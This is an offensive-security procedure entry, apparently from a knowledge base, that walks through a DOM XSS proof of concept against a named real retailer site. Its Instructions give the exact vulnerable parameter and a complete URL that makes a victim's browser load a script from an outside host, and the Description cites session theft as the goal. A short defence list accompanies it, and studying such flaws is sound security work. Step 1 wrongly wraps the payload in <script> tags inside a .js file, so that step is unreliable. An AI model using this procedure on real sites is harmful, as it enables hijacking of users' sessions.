---
id: proc-craft-poc-script-injection
tags:
  - xss
  - poc
  - script-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:12.745Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft PoC for External Script Injection

## Summary

This procedure crafts a proof-of-concept (PoC) URL that exploits a DOM XSS vulnerability by injecting an external malicious script via an unsanitized parameter, demonstrating arbitrary JavaScript execution.

## Description

Targeting teavana.com's pr_zip_location parameter, the PoC appends a protocol-relative URL to load an attacker-controlled script. The vulnerability stems from direct concatenation in full.js, bypassing sanitization. This is used in scenarios where authenticated users can be tricked into visiting the link, leading to session theft. Prerequisites: Identified vulnerable parameter and a hosted malicious script (e.g., on whitehat-hacker.com).

## Requirements

1. Vulnerable parameter confirmed from prior reconnaissance.
2. External server hosting a test script (e.g., alert('XSS')).
3. Browser for testing.

## Defense

Defensive measures and detection strategies:

- Use URL validation to block protocol-relative or external domains.
- Employ strict CSP headers to prevent unauthorized script loads.
- Log and alert on unexpected external resource fetches.

## Objectives

1. Inject external JavaScript via URL parameter.
2. Trigger script execution in the victim's browser.
3. Validate exploitation feasibility.

## Instructions

### Step 1: Prepare Malicious Script

**Context**: Host a simple test script to confirm execution.

Upload a file xss.js containing: <script>alert('XSS via Teavana DOM');</script> to a domain like //whitehat-hacker.com/xss.js.

> Ensure the script is accessible via HTTP/HTTPS.

### Step 2: Construct and Test PoC URL

**Context**: Append the payload to exploit the concatenation sink.

Modify the product page URL to: http://www.teavana.com/us/en/tea/green-tea/winterberry-tea-blend-32601.html?pr_zip_location=//whitehat-hacker.com/xss.js. Load in browser and check console/network for script load.

> The parameter feeds into full.js's varDR construction, enabling injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[poc]]
- [[script-injection]]
